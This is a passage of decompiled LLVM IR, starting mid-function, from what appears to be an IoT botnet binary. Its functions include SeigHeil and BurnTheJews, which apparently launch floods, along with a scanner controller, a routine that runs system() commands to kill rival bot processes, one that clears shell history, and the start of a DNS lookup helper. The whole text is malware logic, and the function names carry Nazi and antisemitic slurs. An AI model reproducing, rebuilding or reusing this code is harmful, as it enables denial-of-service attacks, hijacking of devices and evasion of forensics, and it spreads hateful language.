  uselistorder i32 %v2_8051fcd, { 54, 55, 56, 57, 58, 59, 60, 61, 62, 53, 51, 52, 48, 49, 50, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 32, 33, 34, 35, 36, 26, 27, 28, 29, 30, 31, 21, 22, 23, 24, 25, 15, 16, 17, 18, 19, 20, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 3, 4, 0, 5, 6, 63 }
  uselistorder i32 %v2_8051fca, { 47, 48, 45, 46, 49, 50, 43, 44, 42, 41, 40, 38, 39, 36, 37, 34, 35, 33, 32, 31, 30, 28, 29, 27, 26, 25, 24, 22, 23, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 52, 8, 9, 7, 10, 5, 6, 4, 2, 3, 51, 0, 1, 53 }
  uselistorder i32 %stack_var_-648.383, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5, 3, 1, 4, 6, 2, 0 }
  uselistorder i32 %stack_var_-644.484, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-640.485, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-628.288, { 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 21, 19, 16, 12, 10, 8, 3, 2, 1, 0, 6, 7, 5, 4, 11, 9, 15, 18, 17, 20, 14, 22, 13 }
  uselistorder i32 %stack_var_-624.289, { 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 31, 28, 26, 24, 23, 22, 18, 16, 14, 11, 10, 9, 8, 3, 2, 1, 0, 6, 7, 5, 4, 13, 12, 15, 17, 21, 20, 19, 27, 25, 30, 32, 29 }
  uselistorder i32 %storemerge90, { 1, 2, 3, 4, 6, 5, 0 }
  uselistorder i32 %v2_805297b, { 0, 11, 10, 7, 6, 5, 4, 3, 9, 8, 2, 1, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 %v4_8051fad, { 2, 1, 0 }
  uselistorder i32 %storemerge6105, { 2, 1, 0 }
  uselistorder i32 %v0_8051f7c, { 2, 1, 0 }
  uselistorder i32 %v2_8051f53, { 1, 0 }
  uselistorder i32 %v2_8051f36, { 30, 29, 0, 28, 1, 27, 33, 32, 2, 31, 3, 26, 25, 24, 42, 40, 39, 38, 41, 37, 36, 35, 34, 46, 53, 52, 4, 51, 5, 50, 6, 49, 48, 47, 45, 44, 43, 60, 59, 58, 57, 56, 55, 7, 54, 64, 66, 67, 65, 63, 62, 61, 75, 74, 73, 72, 71, 70, 69, 8, 68, 79, 80, 78, 77, 76, 85, 84, 89, 88, 87, 86, 83, 82, 81, 97, 98, 96, 95, 94, 93, 9, 92, 102, 10, 101, 100, 103, 11, 99, 12, 105, 104, 91, 13, 90, 14, 23, 15, 106, 16, 22, 17, 18, 21, 20, 19 }
  uselistorder i32 %v2_8051f25, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8051ef3, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-56.0, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v2_8051e6e, { 1, 0, 2 }
  uselistorder i32 %v15_8051e38, { 4, 2, 3, 1, 5, 0, 6, 7 }
  uselistorder i32* %stack_var_-684, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32* %stack_var_-608, { 2, 0, 3, 1, 5, 4 }
  uselistorder i32* %stack_var_-600, { 5, 4, 2, 3, 1, 0, 6 }
  uselistorder i32* %stack_var_-320, { 1, 0, 2 }
  uselistorder i32* %stack_var_-328, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-332, { 3, 2, 4, 1, 0, 5, 6 }
  uselistorder i32* %stack_var_-336, { 5, 1, 9, 8, 4, 6, 10, 3, 2, 7, 11, 0, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 8, 9, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 24, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 62, 63, 60, 64, 65, 66, 67, 68, 69, 70, 71, 72 }
  uselistorder i32* %eax.global-to-local, { 239, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 13, 21, 22, 23, 24, 25, 26, 27, 49, 28, 29, 30, 31, 32, 33, 0, 34, 35, 36, 37, 43, 44, 45, 46, 47, 38, 39, 40, 41, 42, 48, 258, 64, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 257, 65, 66, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 69, 95, 96, 97, 98, 99, 100, 102, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 123, 124, 127, 125, 126, 128, 129, 122, 130, 131, 132, 133, 134, 135, 137, 136, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 158, 159, 162, 160, 161, 163, 164, 157, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 227, 228, 229, 230, 231, 226, 232, 233, 234, 235, 236, 237, 238, 256, 242, 240, 241, 259, 243, 244, 245, 246, 1, 247, 248, 249, 250, 251, 252, 253, 255, 254 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__GI_snprintf, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @get_ipstate_host, { 2, 1, 0 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @send, { 11, 10, 9, 8, 7, 6, 5, 2, 1, 0, 4, 3 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32)* @reset_ipstate, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8052d64, { 33, 1, 7, 8, 9, 2, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18, 19, 20, 21, 22, 23, 4, 24, 25, 26, 5, 27, 28, 29, 30, 31, 6, 32, 0 }
  uselistorder label %dec_label_pc_8052baf, { 1, 0 }
  uselistorder label %dec_label_pc_8052b4e, { 1, 0 }
  uselistorder label %dec_label_pc_8052a52, { 1, 0 }
  uselistorder label %dec_label_pc_8052a37, { 1, 0 }
  uselistorder label %dec_label_pc_805210e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ff9, { 1, 0 }
  uselistorder label %dec_label_pc_8051fc4, { 1, 0 }
  uselistorder label %dec_label_pc_8051fb8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f70, { 1, 0 }
  uselistorder label %dec_label_pc_8051eb5, { 1, 0 }
}

define i32 @SeigHeil(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052d86 = load i32, i32* @ebp, align 4
  store i32 %v0_8052d86, i32* %stack_var_-4, align 4
  %v4_8052d86 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8052d86, i32* @ebp, align 4
  %v1_8052d8c = call i32 @fork(i32 %v0_8052d86)
  %v1_8052d99 = call i32 @sysconf(i32 84)
  %v2_8052da7 = mul i32 %v1_8052d99, 64
  %v4_8052db4 = icmp eq i32 %v1_8052d8c, 0
  br i1 %v4_8052db4, label %dec_label_pc_8052dea.preheader, label %dec_label_pc_8052dba

dec_label_pc_8052dba:                             ; preds = %entry
  store i32 %v1_8052d8c, i32* @global_var_80748e0.351, align 32
  br label %dec_label_pc_8052df2

dec_label_pc_8052dea.preheader:                   ; preds = %entry
  %v5_8052df022 = icmp sgt i32 %v1_8052d99, 0
  br i1 %v5_8052df022, label %dec_label_pc_8052dd3.lr.ph, label %dec_label_pc_8052df2

dec_label_pc_8052dd3.lr.ph:                       ; preds = %dec_label_pc_8052dea.preheader
  br label %dec_label_pc_8052dd3

dec_label_pc_8052dd3:                             ; preds = %dec_label_pc_8052dd3, %dec_label_pc_8052dd3.lr.ph
  %storemerge23 = phi i32 [ 0, %dec_label_pc_8052dd3.lr.ph ], [ %v4_8052de7, %dec_label_pc_8052dd3 ]
  %v3_8052ddf = call i32 @BurnTheJews(i32 370, i32 %v2_8052da7, i32 %arg1)
  %v4_8052de7 = add nuw nsw i32 %storemerge23, 1
  %exitcond = icmp eq i32 %v4_8052de7, %v1_8052d99
  br i1 %exitcond, label %dec_label_pc_8052df2, label %dec_label_pc_8052dd3

dec_label_pc_8052df2:                             ; preds = %dec_label_pc_8052dea.preheader, %dec_label_pc_8052dd3, %dec_label_pc_8052dba
  %v0_8052df3 = phi i32 [ %v1_8052d8c, %dec_label_pc_8052dba ], [ 0, %dec_label_pc_8052dea.preheader ], [ %v1_8052d99, %dec_label_pc_8052dd3 ]
  %v2_8052df2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052df2, i32* @ebp, align 4
  ret i32 %v0_8052df3

; uselistorder directives
  uselistorder i32 %v1_8052d99, { 1, 2, 3, 0 }
  uselistorder i32 %v1_8052d8c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052df2, { 1, 0, 2 }
}

define i32 @doScanner(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp30 = icmp slt i32 %arg3, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_8052e1d, label %dec_label_pc_8052e02

dec_label_pc_8052e02:                             ; preds = %entry
  %v5_8052e02 = icmp ult i32* %stack_var_-60, inttoptr (i32 4 to i32*)
  store i1 %v5_8052e02, i1* %cf.global-to-local, align 1
  %v3_8052e10 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_806a4b8.352 to i32))
  %v0_8052e15 = load i32, i32* @esp, align 4
  %v2_8052e15 = icmp ugt i32 %v0_8052e15, -17
  store i1 %v2_8052e15, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053008

dec_label_pc_8052e1d:                             ; preds = %entry
  %v1_8052e20 = add i32 %arg4, 4
  %v5_8052e20 = icmp ugt i32 %arg4, -5
  store i1 %v5_8052e20, i1* %cf.global-to-local, align 1
  %v1_8052e23 = inttoptr i32 %v1_8052e20 to i32*
  %v2_8052e23 = load i32, i32* %v1_8052e23, align 4
  store i1 false, i1* @df, align 1
  %v4_8052e37 = inttoptr i32 %v2_8052e23 to i8*
  store i32 %v2_8052e23, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_806a4d5.353 to i32), i32* @edi, align 4
  %v7_8052e40 = call i32 @_strncmp(i8* %v4_8052e37, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806a4d5.353, i32 0, i32 0), i32 3)
  %v8_8052e40 = urem i32 %v7_8052e40, 2
  %v9_8052e40 = icmp eq i32 %v8_8052e40, 0
  %v0_8052e42 = load i1, i1* %cf.global-to-local, align 1
  %v2_8052e42 = or i1 %v0_8052e42, %v9_8052e40
  %v3_8052e42 = zext i1 %v2_8052e42 to i32
  %v4_8052e42 = load i32, i32* @edx, align 4
  %v5_8052e42 = and i32 %v4_8052e42, -256
  %v6_8052e42 = or i32 %v3_8052e42, %v5_8052e42
  %v7_8052e42 = xor i32 %v6_8052e42, 1
  store i32 %v7_8052e42, i32* %edx.global-to-local, align 4
  %v3_8052e48 = and i32 %v7_8052e40, -256
  %v1_8052e4a = trunc i32 %v7_8052e42 to i8
  %v3_8052e4a = zext i1 %v0_8052e42 to i8
  %v4_8052e4a = sub nsw i8 %v1_8052e4a, %v3_8052e4a
  %v15_8052e4a = icmp eq i8 %v4_8052e4a, 0
  %v20_8052e4a = zext i8 %v4_8052e4a to i32
  %v23_8052e4a = or i32 %v20_8052e4a, %v3_8052e48
  store i32 %v23_8052e4a, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_8052e4a, label %dec_label_pc_8052e8d, label %dec_label_pc_8052e55

dec_label_pc_8052e55:                             ; preds = %dec_label_pc_8052e1d
  store i1 %v5_8052e20, i1* %cf.global-to-local, align 1
  %v2_8052e5b = load i32, i32* %v1_8052e23, align 4
  store i1 false, i1* @df, align 1
  %v4_8052e6f = inttoptr i32 %v2_8052e5b to i8*
  store i32 %v2_8052e5b, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_806a4d8.354 to i32), i32* @edi, align 4
  %v7_8052e78 = call i32 @_strncmp(i8* %v4_8052e6f, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806a4d8.354, i32 0, i32 0), i32 3)
  %v8_8052e78 = urem i32 %v7_8052e78, 2
  %v9_8052e78 = icmp eq i32 %v8_8052e78, 0
  %v0_8052e7a = load i1, i1* %cf.global-to-local, align 1
  %v2_8052e7a = or i1 %v0_8052e7a, %v9_8052e78
  %v3_8052e7a = zext i1 %v2_8052e7a to i32
  %v4_8052e7a = load i32, i32* %edx.global-to-local, align 4
  %v5_8052e7a = and i32 %v4_8052e7a, -256
  %v6_8052e7a = or i32 %v3_8052e7a, %v5_8052e7a
  %v7_8052e7a = xor i32 %v6_8052e7a, 1
  store i32 %v7_8052e7a, i32* %edx.global-to-local, align 4
  %v3_8052e80 = and i32 %v7_8052e78, -256
  %v1_8052e82 = trunc i32 %v7_8052e7a to i8
  %v3_8052e82 = zext i1 %v0_8052e7a to i8
  %v4_8052e82 = sub nsw i8 %v1_8052e82, %v3_8052e82
  %v15_8052e82 = icmp eq i8 %v4_8052e82, 0
  %v20_8052e82 = zext i8 %v4_8052e82 to i32
  %v23_8052e82 = or i32 %v20_8052e82, %v3_8052e80
  store i32 %v23_8052e82, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052e8b = icmp eq i1 %v15_8052e82, false
  br i1 %v1_8052e8b, label %dec_label_pc_8052f07, label %dec_label_pc_8052e8d

dec_label_pc_8052e8d:                             ; preds = %dec_label_pc_8052e55, %dec_label_pc_8052e1d
  %v0_8052e8d = load i32, i32* @global_var_80748e0.351, align 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052e92 = icmp eq i32 %v0_8052e8d, 0
  %v1_8052e94 = icmp eq i1 %v1_8052e92, false
  br i1 %v1_8052e94, label %dec_label_pc_8052ee9, label %dec_label_pc_8052e96

dec_label_pc_8052e96:                             ; preds = %dec_label_pc_8052e8d
  %v0_8052e96 = load i32, i32* @esp, align 4
  %v5_8052e96 = icmp ult i32 %v0_8052e96, 12
  store i1 %v5_8052e96, i1* %cf.global-to-local, align 1
  %v1_8052e9c = call i32 @SeigHeil(i32 %arg1)
  %v0_8052ea4 = load i32, i32* @global_var_80748e0.351, align 32
  %v1_8052ea9 = icmp eq i32 %v0_8052ea4, 0
  %v5_8052ed0 = icmp ult i32* %stack_var_-60, inttoptr (i32 4 to i32*)
  store i1 %v5_8052ed0, i1* %cf.global-to-local, align 1
  br i1 %v1_8052ea9, label %dec_label_pc_8052ecb, label %dec_label_pc_8052ead

dec_label_pc_8052ead:                             ; preds = %dec_label_pc_8052e96
  %v3_8052ebe = call i32 @Send(i32 %arg1, i32 ptrtoint ([43 x i8]* @global_var_806a4dc.355 to i32))
  %v0_8052ec3 = load i32, i32* @esp, align 4
  %v2_8052ec3 = icmp ugt i32 %v0_8052ec3, -17
  store i1 %v2_8052ec3, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053008

dec_label_pc_8052ecb:                             ; preds = %dec_label_pc_8052e96
  %v3_8052edc = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_806a508.356 to i32))
  %v0_8052ee1 = load i32, i32* @esp, align 4
  %v2_8052ee1 = icmp ugt i32 %v0_8052ee1, -17
  store i1 %v2_8052ee1, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053008

dec_label_pc_8052ee9:                             ; preds = %dec_label_pc_8052e8d
  %v0_8052eee = load i32, i32* @esp, align 4
  %v5_8052eee = icmp ult i32 %v0_8052eee, 4
  store i1 %v5_8052eee, i1* %cf.global-to-local, align 1
  %v3_8052efa = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_806a53c.357 to i32))
  %v0_8052eff = load i32, i32* @esp, align 4
  %v2_8052eff = icmp ugt i32 %v0_8052eff, -17
  store i1 %v2_8052eff, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053008

dec_label_pc_8052f07:                             ; preds = %dec_label_pc_8052e55
  store i1 %v5_8052e20, i1* %cf.global-to-local, align 1
  %v2_8052f0d = load i32, i32* %v1_8052e23, align 4
  store i1 false, i1* @df, align 1
  %v4_8052f21 = inttoptr i32 %v2_8052f0d to i8*
  store i32 %v2_8052f0d, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a56f.358 to i32), i32* @edi, align 4
  %v7_8052f2a = call i32 @_strncmp(i8* %v4_8052f21, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a56f.358, i32 0, i32 0), i32 4)
  %v8_8052f2a = urem i32 %v7_8052f2a, 2
  %v9_8052f2a = icmp eq i32 %v8_8052f2a, 0
  %v0_8052f2c = load i1, i1* %cf.global-to-local, align 1
  %v2_8052f2c = or i1 %v0_8052f2c, %v9_8052f2a
  %v3_8052f2c = zext i1 %v2_8052f2c to i32
  %v4_8052f2c = load i32, i32* %edx.global-to-local, align 4
  %v5_8052f2c = and i32 %v4_8052f2c, -256
  %v6_8052f2c = or i32 %v3_8052f2c, %v5_8052f2c
  %v7_8052f2c = xor i32 %v6_8052f2c, 1
  store i32 %v7_8052f2c, i32* %edx.global-to-local, align 4
  %v1_8052f34 = trunc i32 %v7_8052f2c to i8
  %v3_8052f34 = zext i1 %v0_8052f2c to i8
  %v15_8052f34 = icmp eq i8 %v1_8052f34, %v3_8052f34
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_8052f34, label %dec_label_pc_8052f77, label %dec_label_pc_8052f3f

dec_label_pc_8052f3f:                             ; preds = %dec_label_pc_8052f07
  store i1 %v5_8052e20, i1* %cf.global-to-local, align 1
  %v2_8052f45 = load i32, i32* %v1_8052e23, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i1 false, i1* @df, align 1
  %v4_8052f59 = inttoptr i32 %v2_8052f45 to i8*
  store i32 %v2_8052f45, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a573.359 to i32), i32* @edi, align 4
  %v7_8052f62 = call i32 @_strncmp(i8* %v4_8052f59, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a573.359, i32 0, i32 0), i32 4)
  %v8_8052f62 = urem i32 %v7_8052f62, 2
  %v9_8052f62 = icmp eq i32 %v8_8052f62, 0
  %v0_8052f64 = load i1, i1* %cf.global-to-local, align 1
  %v2_8052f64 = or i1 %v0_8052f64, %v9_8052f62
  %v3_8052f64 = zext i1 %v2_8052f64 to i32
  %v4_8052f64 = load i32, i32* %edx.global-to-local, align 4
  %v5_8052f64 = and i32 %v4_8052f64, -256
  %v6_8052f64 = or i32 %v3_8052f64, %v5_8052f64
  %v7_8052f64 = xor i32 %v6_8052f64, 1
  store i32 %v7_8052f64, i32* %edx.global-to-local, align 4
  %v1_8052f6c = trunc i32 %v7_8052f64 to i8
  %v3_8052f6c = zext i1 %v0_8052f64 to i8
  %v15_8052f6c = icmp eq i8 %v1_8052f6c, %v3_8052f6c
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052f75 = icmp eq i1 %v15_8052f6c, false
  br i1 %v1_8052f75, label %dec_label_pc_8052ff2, label %dec_label_pc_8052f77

dec_label_pc_8052f77:                             ; preds = %dec_label_pc_8052f3f, %dec_label_pc_8052f07
  %v0_8052f77 = load i32, i32* @global_var_80748e0.351, align 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052f7c = icmp eq i32 %v0_8052f77, 0
  br i1 %v1_8052f7c, label %dec_label_pc_8052fd7, label %dec_label_pc_8052f80

dec_label_pc_8052f80:                             ; preds = %dec_label_pc_8052f77
  %v0_8052f85 = load i32, i32* @esp, align 4
  %v5_8052f85 = icmp ult i32 %v0_8052f85, 8
  store i1 %v5_8052f85, i1* %cf.global-to-local, align 1
  %v3_8052f8b = call i32 @kill(i32 %v0_8052f77, i32 9)
  %v1_8052f93 = icmp eq i32 %v3_8052f8b, 0
  %v1_8052f95 = icmp eq i1 %v1_8052f93, false
  %v5_8052fc1 = icmp ult i32* %stack_var_-60, inttoptr (i32 4 to i32*)
  store i1 %v5_8052fc1, i1* %cf.global-to-local, align 1
  br i1 %v1_8052f95, label %dec_label_pc_8052fbc, label %dec_label_pc_8052f97

dec_label_pc_8052f97:                             ; preds = %dec_label_pc_8052f80
  %v3_8052fa8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([42 x i8]* @global_var_806a578.360 to i32))
  %v0_8052fad = load i32, i32* @esp, align 4
  %v2_8052fad = icmp ugt i32 %v0_8052fad, -17
  store i1 %v2_8052fad, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_80748e0.351, align 32
  br label %dec_label_pc_8053008

dec_label_pc_8052fbc:                             ; preds = %dec_label_pc_8052f80
  %v3_8052fcd = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_806a5a4.361 to i32))
  %v0_8052fd2 = load i32, i32* @esp, align 4
  %v2_8052fd2 = icmp ugt i32 %v0_8052fd2, -17
  store i1 %v2_8052fd2, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053008

dec_label_pc_8052fd7:                             ; preds = %dec_label_pc_8052f77
  %v0_8052fdc = load i32, i32* @esp, align 4
  %v5_8052fdc = icmp ult i32 %v0_8052fdc, 4
  store i1 %v5_8052fdc, i1* %cf.global-to-local, align 1
  %v3_8052fe8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([47 x i8]* @global_var_806a5d8.362 to i32))
  %v0_8052fed = load i32, i32* @esp, align 4
  %v2_8052fed = icmp ugt i32 %v0_8052fed, -17
  store i1 %v2_8052fed, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053008

dec_label_pc_8052ff2:                             ; preds = %dec_label_pc_8052f3f
  %v0_8052ff2 = load i32, i32* @esp, align 4
  %v5_8052ff2 = icmp ult i32 %v0_8052ff2, 4
  store i1 %v5_8052ff2, i1* %cf.global-to-local, align 1
  %v3_8053000 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_806a4b8.352 to i32))
  %v0_8053005 = load i32, i32* @esp, align 4
  %v2_8053005 = icmp ugt i32 %v0_8053005, -17
  store i1 %v2_8053005, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053008

dec_label_pc_8053008:                             ; preds = %dec_label_pc_8052fd7, %dec_label_pc_8052fbc, %dec_label_pc_8052f97, %dec_label_pc_8052ee9, %dec_label_pc_8052ecb, %dec_label_pc_8052ead, %dec_label_pc_8052e02, %dec_label_pc_8052ff2
  %v0_805300e = phi i32 [ %v3_8052fe8, %dec_label_pc_8052fd7 ], [ %v3_8052fcd, %dec_label_pc_8052fbc ], [ %v3_8052fa8, %dec_label_pc_8052f97 ], [ %v3_8052efa, %dec_label_pc_8052ee9 ], [ %v3_8052edc, %dec_label_pc_8052ecb ], [ %v3_8052ebe, %dec_label_pc_8052ead ], [ %v3_8052e10, %dec_label_pc_8052e02 ], [ %v3_8053000, %dec_label_pc_8052ff2 ]
  ret i32 %v0_805300e

; uselistorder directives
  uselistorder i1 %v0_8052f64, { 1, 0 }
  uselistorder i1 %v0_8052f2c, { 1, 0 }
  uselistorder i1 %v0_8052e7a, { 1, 0 }
  uselistorder i32 %v7_8052e78, { 1, 0 }
  uselistorder i1 %v0_8052e42, { 1, 0 }
  uselistorder i32 %v7_8052e40, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 0, 3, 1, 2 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053008, { 7, 0, 1, 2, 3, 4, 5, 6 }
}

define i32 @botkill() local_unnamed_addr {
entry:
  %stack_var_-528 = alloca i32, align 4
  %v0_8053013 = load i32, i32* @ebx, align 4
  %v1_805301a = call i32 @fork(i32 %v0_8053013)
  %v1_805301f = icmp eq i32 %v1_805301a, 0
  br i1 %v1_805301f, label %dec_label_pc_80530ad, label %dec_label_pc_8053027.preheader

dec_label_pc_8053027.preheader:                   ; preds = %entry
  %v2_805306f = ptrtoint i32* %stack_var_-528 to i32
  br label %dec_label_pc_8053027

dec_label_pc_8053027:                             ; preds = %dec_label_pc_8053030, %dec_label_pc_8053027.preheader
  br label %dec_label_pc_8053030

dec_label_pc_8053030:                             ; preds = %dec_label_pc_8053030, %dec_label_pc_8053027
  %storemerge16 = phi i32 [ 0, %dec_label_pc_8053027 ], [ %v4_805309d, %dec_label_pc_8053030 ]
  %v1_8053033 = mul nuw nsw i32 %storemerge16, 4
  %v2_8053033 = add i32 %v1_8053033, ptrtoint ([114 x i8*]* @global_var_806f8c0.476 to i32)
  %v3_8053033 = inttoptr i32 %v2_8053033 to i32*
  %v4_8053047 = load i32, i32* %v3_8053033, align 4
  store i32 %v4_8053047, i32* @ebx, align 4
  %v4_8053051 = load i32, i32* %v3_8053033, align 4
  store i32 %v4_8053051, i32* @esi, align 4
  %v3_8053076 = call i32 @sprintf(i32 %v2_805306f, i32 ptrtoint ([123 x i8]* @global_var_806a608.477 to i32))
  %v1_8053088 = call i32 @system(i32 %v2_805306f)
  %v1_8053095 = call i32 @sleep(i32 1)
  %v4_805309d = add nuw nsw i32 %storemerge16, 1
  %exitcond = icmp eq i32 %v4_805309d, 114
  br i1 %exitcond, label %dec_label_pc_8053027, label %dec_label_pc_8053030

dec_label_pc_80530ad:                             ; preds = %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge16, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v2_80530c2 = call i32 @system(i32 ptrtoint ([22 x i8]* @global_var_806a683.478 to i32))
  %v2_80530d2 = call i32 @system(i32 ptrtoint ([29 x i8]* @global_var_806a699.479 to i32))
  %v2_80530e2 = call i32 @system(i32 ptrtoint ([21 x i8]* @global_var_806a6b6.480 to i32))
  ret i32 %v2_80530e2
}

define i32 @dns2ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_80530f8 = call i32 @mfork(i32 %arg2)
  %v1_8053100 = icmp eq i32 %v1_80530f8, 0
  %v1_8053102 = icmp eq i1 %v1_8053100, false
  br i1 %v1_8053102, label %dec_label_pc_805318b, label %dec_label_pc_8053108

dec_label_pc_8053108:                             ; preds = %entry
  %v12_8053108 = icmp eq i32 %arg3, 1
  %v1_805310c = icmp eq i1 %v12_8053108, false
  br i1 %v1_805310c, label %dec_label_pc_805316b, label %dec_label_pc_805310e

dec_label_pc_805310e:                             ; preds = %dec_label_pc_8053108
  %v1_8053111 = add i32 %arg4, 4
  %v1_8053114 = inttoptr i32 %v1_8053111 to i32*
  %v2_8053114 = load i32, i32* %v1_8053114, align 4
  %v1_805311a = call i32 @__GI_gethostbyname(i32 %v2_8053114)
  %v1_8053122 = add i32 %v1_805311a, 16
  %v2_8053122 = inttoptr i32 %v1_8053122 to i32*
  %v3_8053122 = load i32, i32* %v2_8053122, align 4
  %v1_8053125 = inttoptr i32 %v3_8053122 to i32*
  %v2_8053125 = load i32, i32* %v1_8053125, align 4
  %v1_805312a = inttoptr i32 %v2_8053125 to i32*
  %v2_805312a = load i32, i32* %v1_805312a, align 4
  %v1_805312c = call i32 @__GI_inet_ntoa(i32 %v2_805312a)
  %v4_805313e = bitcast i32* %stack_var_-20 to i8*
  %v5_805313e = call i32 @strncpy(i8* %v4_805313e, i32 %v1_805312c, i32 16)
